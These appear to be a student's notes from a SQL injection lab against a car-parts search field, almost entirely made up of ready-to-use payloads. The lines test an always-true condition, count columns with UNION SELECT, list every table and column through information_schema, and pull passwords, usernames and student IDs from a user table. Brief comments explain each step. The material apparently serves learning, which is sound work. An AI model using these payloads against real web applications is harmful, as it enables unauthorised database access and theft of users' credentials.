Audi' or 1='1    #try al the types at the start(audi,ford,Honda,dodge)
Audi' UNION SELECT 1,2,3,4; #   #octothorpe is a comment which cancels out their query and just uses mine
Audi' UNION SELECT 1,2,3,4,5; #    #same thing but testing if there is another column if last command ran an error

step 1 
step 2 find out how many columns there are


Audi ' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns; #

Audi ' UNION SELECT passwd,2,username,studentID,5 FROM session.userinfo; #
Audi ' UNION SELECT passwd,2,username,4,5 FROM session.userinfo; #

Audi ' UNION SELECT name,2,cost,size,tireid FROM session.Tires; #
